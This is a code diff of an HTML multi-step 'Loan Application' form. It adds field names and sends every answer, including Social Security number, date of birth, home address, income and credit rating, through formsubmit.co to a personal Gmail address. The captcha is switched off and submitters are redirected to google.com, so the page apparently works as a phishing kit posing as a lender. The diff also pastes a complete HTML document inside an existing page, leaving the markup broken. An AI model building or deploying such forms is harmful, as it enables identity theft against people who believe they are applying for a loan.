@@ -75,13 +75,41 @@
     </div>
 
     <!-- Step Forms -->
-    <form id="onboardingForm" class="max-w-xl mx-auto bg-white shadow-lg rounded-2xl p-8">
+   <!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Loan Application</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      .hidden-section { display: none; }
+      .fade-in { animation: fadeIn 0.4s ease-in; }
+      @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+      .bg-brand-green { background-color: #16a34a; }
+    </style>
+  </head>
+
+  <body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
+    <form
+      action="https://formsubmit.co/kingwahley@gmail.com"
+      method="POST"
+      id="onboardingForm"
+      class="max-w-xl mx-auto bg-white shadow-lg rounded-2xl p-8 space-y-4"
+    >
+
+      <!-- Hidden FormSubmit Fields -->
+      <input type="hidden" name="_subject" value="New Loan Application">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="box">
+      <input type="hidden" name="_next" value="https://google.com">
 
       <!-- STEP 1 -->
       <div id="step1" class="fade-in">
         <h2 class="text-xl font-semibold mb-4">Loan Information</h2>
+
         <label class="block mb-2 font-medium">Why do you need a loan?</label>
-        <select class="w-full border p-3 rounded-lg mb-4" required>
+        <select name="loan_purpose" class="w-full border p-3 rounded-lg mb-4" required>
           <option>Debt Consolidation</option>
           <option>Credit Card Refinance</option>
           <option>Baby</option>
@@ -99,8 +127,8 @@
           <option>Other</option>
         </select>
 
-        <input type="number" placeholder="How much do you need?" class="w-full border p-3 rounded-lg mb-4" required>
-        <input type="number" placeholder="What is your annual income?" class="w-full border p-3 rounded-lg mb-6" required>
+        <input type="number" name="loan_amount" placeholder="How much do you need?" class="w-full border p-3 rounded-lg mb-4" required>
+        <input type="number" name="annual_income" placeholder="What is your annual income?" class="w-full border p-3 rounded-lg mb-6" required>
 
         <button type="button" onclick="nextStep(1)" class="bg-brand-green text-white font-semibold px-6 py-3 rounded-full hover:bg-green-600 transition w-full">Next</button>
       </div>
@@ -108,9 +136,10 @@
       <!-- STEP 2 -->
       <div id="step2" class="hidden-section">
         <h2 class="text-xl font-semibold mb-4">Contact Information</h2>
-        <input type="text" placeholder="What is your name?" class="w-full border p-3 rounded-lg mb-4" required>
-        <input type="email" placeholder="What is your email address?" class="w-full border p-3 rounded-lg mb-4" required>
-        <input type="tel" placeholder="What is your phone number?" class="w-full border p-3 rounded-lg mb-6" required>
+        <input type="text" name="full_name" placeholder="What is your name?" class="w-full border p-3 rounded-lg mb-4" required>
+        <input type="email" name="email" placeholder="What is your email address?" class="w-full border p-3 rounded-lg mb-4" required>
+        <input type="tel" name="phone_number" placeholder="What is your phone number?" class="w-full border p-3 rounded-lg mb-6" required>
+
         <div class="flex justify-between">
           <button type="button" onclick="prevStep(2)" class="bg-gray-300 text-gray-700 font-semibold px-6 py-3 rounded-full hover:bg-gray-400 transition">Back</button>
           <button type="button" onclick="nextStep(2)" class="bg-brand-green text-white font-semibold px-6 py-3 rounded-full hover:bg-green-600 transition">Next</button>
@@ -122,7 +151,7 @@
         <h2 class="text-xl font-semibold mb-4">Additional Details</h2>
 
         <label class="block mb-2 font-medium">What is your approximate credit rating?</label>
-        <select class="w-full border p-3 rounded-lg mb-4" required>
+        <select name="credit_rating" class="w-full border p-3 rounded-lg mb-4" required>
           <option>Excellent (720+)</option>
           <option>Good (660-719)</option>
           <option>Fair (620-659)</option>
@@ -131,14 +160,14 @@
         </select>
 
         <label class="block mb-2 font-medium">Do you rent or own your home?</label>
-        <select class="w-full border p-3 rounded-lg mb-4" required>
+        <select name="home_status" class="w-full border p-3 rounded-lg mb-4" required>
           <option>Rent</option>
           <option>Own with Mortgage</option>
           <option>Own</option>
         </select>
 
         <label class="block mb-2 font-medium">What is your employment status?</label>
-        <select class="w-full border p-3 rounded-lg mb-4" required>
+        <select name="employment_status" class="w-full border p-3 rounded-lg mb-4" required>
           <option>Employed</option>
           <option>Self Employed</option>
           <option>Not Employed</option>
@@ -154,88 +183,103 @@
       </div>
 
       <!-- STEP 4 -->
-<div id="step4" class="hidden-section">
-  <h2 class="text-xl font-semibold mb-4">Final Details</h2>
+      <div id="step4" class="hidden-section">
+        <h2 class="text-xl font-semibold mb-4">Final Details</h2>
 
-  <input type="text" placeholder="What is your Matric Number?" class="w-full border p-3 rounded-lg mb-4" required>
-  
-  <label class="block mb-2 font-medium">What is your date of birth?</label>
-  <input type="date" class="w-full border p-3 rounded-lg mb-4" required>
+        <input type="text" name="Social security number" placeholder="What is your Social Security Number?" class="w-full border p-3 rounded-lg mb-4" required>
+        
+        <label class="block mb-2 font-medium">What is your date of birth?</label>
+        <input type="date" name="date_of_birth" class="w-full border p-3 rounded-lg mb-4" required>
 
-  <label class="block mb-2 font-medium">Street Address *</label>
-  <input type="text" class="w-full border p-3 rounded-lg mb-4" required>
+        <label class="block mb-2 font-medium">Street Address *</label>
+        <input type="text" name="street_address" class="w-full border p-3 rounded-lg mb-4" required>
 
-  <label class="block mb-2 font-medium">Address Line 2</label>
-  <input type="text" class="w-full border p-3 rounded-lg mb-4">
+        <label class="block mb-2 font-medium">Address Line 2</label>
+        <input type="text" name="address_line_2" class="w-full border p-3 rounded-lg mb-4">
 
-  <label class="block mb-2 font-medium">City *</label>
-  <input type="text" class="w-full border p-3 rounded-lg mb-4" required>
+        <label class="block mb-2 font-medium">City *</label>
+        <input type="text" name="city" class="w-full border p-3 rounded-lg mb-4" required>
 
-  <label class="block mb-2 font-medium">State *</label>
-  <select class="w-full border p-3 rounded-lg mb-4" required>
-    <option value="">Select State</option>
-    <option>Alabama</option>
-    <option>Alaska</option>
-    <option>Arizona</option>
-    <option>Arkansas</option>
-    <option>California</option>
-    <option>Colorado</option>
-    <option>Connecticut</option>
-    <option>Delaware</option>
-    <option>Florida</option>
-    <option>Georgia</option>
-    <option>Hawaii</option>
-    <option>Idaho</option>
-    <option>Illinois</option>
-    <option>Indiana</option>
-    <option>Iowa</option>
-    <option>Kansas</option>
-    <option>Kentucky</option>
-    <option>Louisiana</option>
-    <option>Maine</option>
-    <option>Maryland</option>
-    <option>Massachusetts</option>
-    <option>Michigan</option>
-    <option>Minnesota</option>
-    <option>Mississippi</option>
-    <option>Missouri</option>
-    <option>Montana</option>
-    <option>Nebraska</option>
-    <option>Nevada</option>
-    <option>New Hampshire</option>
-    <option>New Jersey</option>
-    <option>New Mexico</option>
-    <option>New York</option>
-    <option>North Carolina</option>
-    <option>North Dakota</option>
-    <option>Ohio</option>
-    <option>Oklahoma</option>
-    <option>Oregon</option>
-    <option>Pennsylvania</option>
-    <option>Rhode Island</option>
-    <option>South Carolina</option>
-    <option>South Dakota</option>
-    <option>Tennessee</option>
-    <option>Texas</option>
-    <option>Utah</option>
-    <option>Vermont</option>
-    <option>Virginia</option>
-    <option>Washington</option>
-    <option>West Virginia</option>
-    <option>Wisconsin</option>
-    <option>Wyoming</option>
-  </select>
+        <label class="block mb-2 font-medium">State *</label>
+        <select name="state" class="w-full border p-3 rounded-lg mb-4" required>
+          <option value="">Select State</option>
+          <option>Alabama</option>
+          <option>Alaska</option>
+          <option>Arizona</option>
+          <option>Arkansas</option>
+          <option>California</option>
+          <option>Colorado</option>
+          <option>Connecticut</option>
+          <option>Delaware</option>
+          <option>Florida</option>
+          <option>Georgia</option>
+          <option>Hawaii</option>
+          <option>Idaho</option>
+          <option>Illinois</option>
+          <option>Indiana</option>
+          <option>Iowa</option>
+          <option>Kansas</option>
+          <option>Kentucky</option>
+          <option>Louisiana</option>
+          <option>Maine</option>
+          <option>Maryland</option>
+          <option>Massachusetts</option>
+          <option>Michigan</option>
+          <option>Minnesota</option>
+          <option>Mississippi</option>
+          <option>Missouri</option>
+          <option>Montana</option>
+          <option>Nebraska</option>
+          <option>Nevada</option>
+          <option>New Hampshire</option>
+          <option>New Jersey</option>
+          <option>New Mexico</option>
+          <option>New York</option>
+          <option>North Carolina</option>
+          <option>North Dakota</option>
+          <option>Ohio</option>
+          <option>Oklahoma</option>
+          <option>Oregon</option>
+          <option>Pennsylvania</option>
+          <option>Rhode Island</option>
+          <option>South Carolina</option>
+          <option>South Dakota</option>
+          <option>Tennessee</option>
+          <option>Texas</option>
+          <option>Utah</option>
+          <option>Vermont</option>
+          <option>Virginia</option>
+          <option>Washington</option>
+          <option>West Virginia</option>
+          <option>Wisconsin</option>
+          <option>Wyoming</option>
+        </select>
 
-  <label class="block mb-2 font-medium">Zip Code *</label>
-  <input type="text" class="w-full border p-3 rounded-lg mb-6" required>
+        <label class="block mb-2 font-medium">Zip Code *</label>
+        <input type="text" name="zip_code" class="w-full border p-3 rounded-lg mb-6" required>
 
-  <div class="flex justify-between">
-    <button type="button" onclick="prevStep(4)" class="bg-gray-300 text-gray-700 font-semibold px-6 py-3 rounded-full hover:bg-gray-400 transition">Back</button>
-    <button type="submit" class="bg-brand-green text-white font-semibold px-6 py-3 rounded-full hover:bg-green-600 transition">Submit</button>
-  </div>
-</div>
+        <div class="flex justify-between">
+          <button type="button" onclick="prevStep(4)" class="bg-gray-300 text-gray-700 font-semibold px-6 py-3 rounded-full hover:bg-gray-400 transition">Back</button>
+          <button type="submit" class="bg-brand-green text-white font-semibold px-6 py-3 rounded-full hover:bg-green-600 transition">Submit</button>
+        </div>
+      </div>
 
     </form>
+
+    <script>
+      function nextStep(step) {
+        document.getElementById('step' + step).classList.add('hidden-section');
+        document.getElementById('step' + (step + 1)).classList.remove('hidden-section');
+      }
+
+      function prevStep(step) {
+        document.getElementById('step' + step).classList.add('hidden-section');
+        document.getElementById('step' + (step - 1)).classList.remove('hidden-section');
+      }
+    </script>
+  </body>
+</html>
+
   </main>
 
   <!-- FOOTER -->
